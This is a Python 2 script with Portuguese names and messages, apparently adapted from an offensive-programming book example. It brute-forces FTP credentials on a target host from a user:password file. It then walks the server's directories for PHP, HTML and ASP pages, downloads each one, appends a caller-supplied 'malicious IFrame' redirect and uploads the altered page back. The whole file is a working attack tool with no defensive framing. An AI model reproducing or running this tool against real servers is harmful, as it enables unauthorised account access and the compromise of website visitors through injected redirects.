#!/usr/bin/python
# -*- coding: utf-8 -*-

import ftplib, time, optparse

def loginBruto(host_alvo, arquivo_senhas):
    arq_sen = open(arquivo_senhas, 'r')
    for linha in arq_sen.readlines():
        usuario = linha.split(':')[0]
        senha = linha.split(':')[1].strip('\r').strip('\n')
        print "[+] Tentando: " + usuario + "/" + senha
        try:
            ftp = ftplib.FTP(host_alvo, timeout=5)
            ftp.login(usuario, senha)
            print '\n[*] ' + host_alvo + \
                ' FTP Login Sucesso: ' + usuario + '/' + senha
            return (ftp, usuario)
        except Exception, e:
            pass
    print '\n[-] Não foi possível descobrir as credenciais FTP.'
    return (None, None)

def paginasPadrao(ftp, usuario, diretorio, redirecionar):
    try:
        lista_diretorios = ftp.nlst(diretorio)
    except:
        lista_diretorios = []
        print '[-] Não foi possível listar o conteúdo.'
        return
    for fileName in lista_diretorios:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print '[+] Encontrado a página padrão: ' + fileName
            paginaInject(ftp, usuario, fn, redirecionar)
        elif not '.' in fn:
            paginasPadrao(ftp, usuario, fn, redirecionar)
    return

def paginaInject(ftp, usuario, pagina, redirecionar):
    try:
        pagina = '/home/' + usuario + '/' + pagina
        f = open(pagina + '.tmp', 'w')
        ftp.retrlines('RETR ' + pagina, f.write)
        print '[+] Página baixada: ' + pagina

        f.write(redirecionar)
        f.close()
        print '[+] Injetado IFrame malicioso em: ' + pagina

        ftp.storlines('STOR ' + pagina, open(pagina + '.tmp'))
        print '[+] Página injetada enviada: ' + pagina
    except Exception as e:
        print e


def inicio():
    analisador = optparse.OptionParser('use forca_bruta_ftp '+\
      '-H <host alvo> -f <arquivo_senhas> -r <redirecionar>')
    analisador.add_option('-H', dest='host', type='string',\
      help='especifique o host alvo')
    analisador.add_option('-f', dest='arquivo', type='string',\
      help='especifique o arquivo de usuarios e senhas')
    analisador.add_option('-r', dest='redirecionar', type='string',\
    help='especifique o redirecionamento')

    (opcoes, args) = analisador.parse_args()

    host = opcoes.host
    arquivo = opcoes.arquivo
    redirecionar = opcoes.redirecionar

    if (host == None) | (arquivo == None):
        print analisador.usage
        exit(0)

    ftp, usuario = loginBruto(host, arquivo)

    if ftp:
        diretorio = ''
        paginasPadrao(ftp, usuario, diretorio, redirecionar)

if __name__ == '__main__':
    inicio()
